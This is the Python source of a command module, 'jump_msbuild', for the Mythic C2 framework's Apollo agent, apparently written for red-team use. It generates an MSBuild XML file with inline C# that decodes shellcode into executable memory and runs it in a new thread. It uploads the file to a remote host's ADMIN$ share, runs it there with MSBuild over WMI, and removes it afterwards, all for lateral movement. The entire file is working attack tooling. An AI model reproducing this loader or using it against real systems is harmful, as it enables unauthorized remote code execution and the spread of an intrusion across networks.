from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *
import base64
import asyncio


DEFAULT_REMOTE_PATH = "ADMIN$\\apollo.xml"
DEFAULT_XML_PATH = "C:\\Windows\\apollo.xml"
DEFAULT_MSBUILD_PATH = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"


def _strip_surrounding_quotes(value):
    if value is None:
        return value
    value = value.strip()
    if len(value) >= 2 and value[0] == value[-1] and value[0] in ["'", '"']:
        return value[1:-1]
    return value


def _field_value(obj, *names):
    if isinstance(obj, dict):
        for name in names:
            if name in obj:
                return obj[name]
    for name in names:
        if hasattr(obj, name):
            return getattr(obj, name)
    return None


def _payload_build_parameter(payload, name, fallback_index=None):
    build_parameters = getattr(payload, "BuildParameters", []) or []
    for parameter in build_parameters:
        parameter_name = _field_value(
            parameter,
            "Name",
            "name",
            "BuildParameter",
            "build_parameter",
            "ParameterName",
            "parameter_name",
        )
        if parameter_name == name:
            return _field_value(parameter, "Value", "value")
    if fallback_index is not None and len(build_parameters) > fallback_index:
        return _field_value(build_parameters[fallback_index], "Value", "value")
    return None


def _is_binary_shellcode_payload(payload):
    output_type = _payload_build_parameter(payload, "output_type", 0)
    shellcode_format = _payload_build_parameter(payload, "shellcode_format", 1)
    return output_type == "Shellcode" and shellcode_format in [None, "", "Binary"]


def _remote_filename(remote_path):
    normalized = remote_path.replace("/", "\\").rstrip("\\")
    if normalized == "":
        return "apollo.xml"
    filename = normalized.split("\\")[-1]
    return filename or "apollo.xml"


def _remote_unc_path(host, remote_path):
    return f"\\\\{host}\\{remote_path}"


def build_msbuild_xml(shellcode):
    shellcode_b64 = base64.b64encode(shellcode).decode("ascii")
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<Project ToolsVersion="4.0" DefaultTargets="Apollo" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <UsingTask TaskName="ApolloTask" TaskFactory="CodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs"><![CDATA[
using System;
using System.Runtime.InteropServices;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class ApolloTask : Task
{{
    [DllImport("kernel32.dll")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UIntPtr size, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

    [DllImport("kernel32.dll")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public override bool Execute()
    {{
        byte[] payload = Convert.FromBase64String("{shellcode_b64}");
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (UIntPtr)payload.Length, 0x3000, 0x40);
        if (addr == IntPtr.Zero)
        {{
            return false;
        }}

        Marshal.Copy(payload, 0, addr, payload.Length);
        UInt32 threadId = 0;
        IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, ref threadId);
        if (thread == IntPtr.Zero)
        {{
            return false;
        }}

        WaitForSingleObject(thread, UInt32.MaxValue);
        return true;
    }}
}}
]]></Code>
    </Task>
  </UsingTask>
  <Target Name="Apollo">
    <ApolloTask />
  </Target>
</Project>
"""


class JumpMSBuildArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="Payload",
                cli_name="Payload",
                display_name="Payload",
                type=ParameterType.ChooseOne,
                dynamic_query_function=self.get_payloads,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="specific_payload",
                        ui_position=5,
                    ),
                ],
            ),
            CommandParameter(
                name="host",
                cli_name="host",
                display_name="Host",
                type=ParameterType.String,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=1,
                    ),
                    ParameterGroupInfo(
                        required=True,
                        group_name="specific_payload",
                        ui_position=1,
                    ),
                ],
            ),
            CommandParameter(
                name="remote_path",
                cli_name="remote_path",
                display_name="Remote Upload Location",
                type=ParameterType.String,
                default_value=DEFAULT_REMOTE_PATH,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=2,
                    ),
                    ParameterGroupInfo(
                        required=False,
                        group_name="specific_payload",
                        ui_position=2,
                    ),
                ],
            ),
            CommandParameter(
                name="xml_path",
                cli_name="xml_path",
                display_name="Remote XML Path",
                type=ParameterType.String,
                default_value=DEFAULT_XML_PATH,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=3,
                    ),
                    ParameterGroupInfo(
                        required=False,
                        group_name="specific_payload",
                        ui_position=3,
                    ),
                ],
            ),
            CommandParameter(
                name="msbuild_path",
                cli_name="msbuild_path",
                display_name="MSBuild Path",
                type=ParameterType.String,
                default_value=DEFAULT_MSBUILD_PATH,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=4,
                    ),
                    ParameterGroupInfo(
                        required=False,
                        group_name="specific_payload",
                        ui_position=4,
                    ),
                ],
            ),
        ]

    async def get_payloads(self, inputMsg: PTRPCDynamicQueryFunctionMessage) -> PTRPCDynamicQueryFunctionMessageResponse:
        fileResponse = PTRPCDynamicQueryFunctionMessageResponse(Success=False)
        payload_search = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
            CallbackID=inputMsg.Callback,
            PayloadTypes=["apollo"],
            IncludeAutoGeneratedPayloads=False,
            BuildParameters=[MythicRPCPayloadSearchBuildParameter(
                PayloadType="apollo",
                BuildParameterValues={"output_type": "Shellcode"},
            )],
        ))

        if payload_search.Success:
            file_names = []
            for f in payload_search.Payloads:
                if _is_binary_shellcode_payload(f):
                    file_names.append(f"{f.Filename} - {f.Description} - {f.UUID}")
            fileResponse.Success = True
            fileResponse.Choices = file_names
            return fileResponse
        else:
            fileResponse.Error = payload_search.Error
            return fileResponse

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("Require JSON parameters.")
        if self.command_line[0] != "{":
            raise Exception("jump_msbuild requires JSON parameters and not raw command line.")
        self.load_args_from_json_string(self.command_line)

        default_paths = {
            "remote_path": DEFAULT_REMOTE_PATH,
            "xml_path": DEFAULT_XML_PATH,
            "msbuild_path": DEFAULT_MSBUILD_PATH,
        }
        for path_arg, default_value in default_paths.items():
            value = self.get_arg(path_arg)
            if value is None or value == "":
                value = default_value
            value = _strip_surrounding_quotes(value)
            if value is not None:
                self.add_arg(path_arg, value)

        remote_path = self.get_arg("remote_path")
        xml_path = self.get_arg("xml_path")
        if (remote_path == DEFAULT_REMOTE_PATH and xml_path != DEFAULT_XML_PATH) or (
            remote_path != DEFAULT_REMOTE_PATH and xml_path == DEFAULT_XML_PATH
        ):
            raise Exception(
                "Remote Upload Location and Remote XML Path must be updated together or neither updated.\n"
                "remote_path is the UNC-style upload path and xml_path is the local path used by MSBuild on the remote host."
            )


async def mirror_up_output(task: PTTaskCompletionFunctionMessage):
    response_search = await SendMythicRPCResponseSearch(MythicRPCResponseSearchMessage(
        TaskID=task.SubtaskData.Task.ID,
    ))
    if response_search.Success:
        for r in response_search.Responses:
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=task.TaskData.Task.ID,
                Response=r.Response.encode(),
            ))
        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
            TaskID=task.TaskData.Task.ID,
            Response="\n".encode(),
        ))


async def cleanup_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=True)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: failed to remove msbuild xml"
    return response


async def wmi_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: failed to execute msbuild via wmi"
        response.Completed = True
        return response

    await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
        TaskID=task.TaskData.Task.ID,
        UpdateStatus="removing msbuild xml...",
    ))
    cleanup_path = _remote_unc_path(
        task.TaskData.args.get_arg("host"),
        task.TaskData.args.get_arg("remote_path"),
    )
    subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
        TaskID=task.TaskData.Task.ID,
        SubtaskCallbackFunction="cleanup_callback",
        CommandName="rm",
        Params=cleanup_path,
    ))
    if not subtask.Success:
        response.Success = False
        response.TaskStatus = f"error: failed to queue cleanup: {subtask.Error}"
        response.Completed = True
    return response


async def upload_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: failed to copy over msbuild xml"
        response.Completed = True
        return response

    await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
        TaskID=task.TaskData.Task.ID,
        UpdateStatus="executing msbuild via wmi...",
    ))
    command = f"\"{task.TaskData.args.get_arg('msbuild_path')}\" \"{task.TaskData.args.get_arg('xml_path')}\""
    subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
        TaskID=task.TaskData.Task.ID,
        SubtaskCallbackFunction="wmi_callback",
        CommandName="wmiexecute",
        Params=json.dumps({
            "command": command,
            "host": task.TaskData.args.get_arg("host"),
        }),
    ))
    if not subtask.Success:
        response.Success = False
        response.TaskStatus = f"error: failed to queue wmiexecute: {subtask.Error}"
        response.Completed = True
    return response


async def _wait_for_payload_build(payload_uuid):
    while True:
        resp = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
            PayloadUUID=payload_uuid,
        ))
        if not resp.Success:
            raise Exception(f"Failed to find generated payload: {resp.Error}")
        if len(resp.Payloads) == 0:
            raise Exception(f"No payloads found matching {payload_uuid}")

        build_phase = resp.Payloads[0].BuildPhase.lower()
        if build_phase == "success":
            return resp.Payloads[0]
        if build_phase == "error":
            raise Exception("Failed to build new Shellcode payload")
        await asyncio.sleep(1)


class JumpMSBuildCommand(CommandBase):
    cmd = "jump_msbuild"
    attributes = CommandAttributes(
        dependencies=["upload", "wmiexecute", "rm"],
    )
    needs_admin = True
    help_cmd = "jump_msbuild hostname"
    description = "Move laterally to a remote host by copying over a shellcode payload within XML and using WMI to load it with MSBuild"
    version = 1
    script_only = True
    author = "@Tw1sm"
    argument_class = JumpMSBuildArguments
    attackmapping = ["T1047", "T1127.001"]
    completion_functions = {
        "upload_callback": upload_callback,
        "wmi_callback": wmi_callback,
        "cleanup_callback": cleanup_callback,
    }

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        payload = None
        if taskData.args.get_parameter_group_name() == "specific_payload":
            _, str_uuid = taskData.args.get_arg("Payload").rsplit(" - ", 1)
            str_uuid = str_uuid.strip()
            payload_search = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
                PayloadUUID=str_uuid,
            ))
            if not payload_search.Success:
                raise Exception("Failed to find payload: {}".format(taskData.args.get_arg("Payload")))
            if len(payload_search.Payloads) == 0:
                raise Exception("No payloads found matching {}".format(taskData.args.get_arg("Payload")))

            payload = payload_search.Payloads[0]
            if payload.BuildPhase.lower() == "error":
                raise Exception("Selected payload failed to build")
            if payload.BuildPhase.lower() != "success":
                raise Exception("Selected payload is not done building")
            if not _is_binary_shellcode_payload(payload):
                raise Exception("Selected payload must be an Apollo Shellcode payload with Binary shellcode format")
        else:
            payload_search = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
                IncludeAutoGeneratedPayloads=False,
                PayloadUUID=taskData.Payload.UUID,
            ))
            if not payload_search.Success:
                raise Exception("Failed to find payload: {}".format(taskData.Payload.UUID))
            if len(payload_search.Payloads) == 0:
                raise Exception("No payloads found matching {}".format(taskData.Payload.UUID))

            payload = payload_search.Payloads[0]
            if not _is_binary_shellcode_payload(payload):
                await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
                    TaskID=taskData.Task.ID,
                    UpdateStatus="building binary Shellcode Apollo...",
                ))
                newPayloadResp = await SendMythicRPCPayloadCreateFromScratch(MythicRPCPayloadCreateFromScratchMessage(
                    TaskID=taskData.Task.ID,
                    PayloadConfiguration=MythicRPCPayloadConfiguration(
                        payload_type="apollo",
                        description=f"MSBuild to host {taskData.args.get_arg('host')}",
                        build_parameters=[
                            {"name": "output_type", "value": "Shellcode"},
                            {"name": "shellcode_format", "value": "Binary"},
                        ],
                        selected_os="Windows",
                        filename="apollo.bin",
                        commands=payload.Commands,
                        c2_profiles=[x.to_json() for x in payload.C2Profiles],
                    ),
                    RemoteHost=taskData.args.get_arg("host"),
                ))
                if not newPayloadResp.Success:
                    logger.exception("Failed to build new payload")
                    raise Exception("Failed to build binary Shellcode payload: {}".format(newPayloadResp.Error))
                payload = await _wait_for_payload_build(newPayloadResp.NewPayloadUUID)

        if payload is None:
            raise Exception("Failed to find payload or generate payload for lateral movement")

        await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
            TaskID=taskData.Task.ID,
            UpdateStatus="generating msbuild xml...",
        ))
        shellcode_resp = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(payload.AgentFileId))
        if not shellcode_resp.Success:
            raise Exception("Failed to fetch shellcode payload contents: {}".format(shellcode_resp.Error))
        shellcode = shellcode_resp.Content
        if isinstance(shellcode, str):
            shellcode = shellcode.encode()
        if len(shellcode) == 0:
            raise Exception("Selected shellcode payload is empty")

        xml_contents = build_msbuild_xml(shellcode).encode()
        xml_file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
            TaskID=taskData.Task.ID,
            FileContents=xml_contents,
            DeleteAfterFetch=True,
            Filename=_remote_filename(taskData.args.get_arg("remote_path")),
            IsScreenshot=False,
            IsDownloadFromAgent=False,
            Comment=f"jump_msbuild XML wrapper for {payload.Filename}",
        ))
        if not xml_file_resp.Success:
            raise Exception("Failed to register msbuild XML payload: {}".format(xml_file_resp.Error))

        remote_unc_path = _remote_unc_path(
            taskData.args.get_arg("host"),
            taskData.args.get_arg("remote_path"),
        )
        response.DisplayParams = (
            f"{payload.Filename} as {remote_unc_path}; "
            f"{taskData.args.get_arg('msbuild_path')} {taskData.args.get_arg('xml_path')}"
        )
        response.TaskStatus = "uploading msbuild xml..."
        subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
            TaskID=taskData.Task.ID,
            SubtaskCallbackFunction="upload_callback",
            CommandName="upload",
            Params=json.dumps({
                "remote_path": remote_unc_path,
                "file": xml_file_resp.AgentFileId,
            }),
        ))
        if not subtask.Success:
            response.Success = False
            response.Error = subtask.Error
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
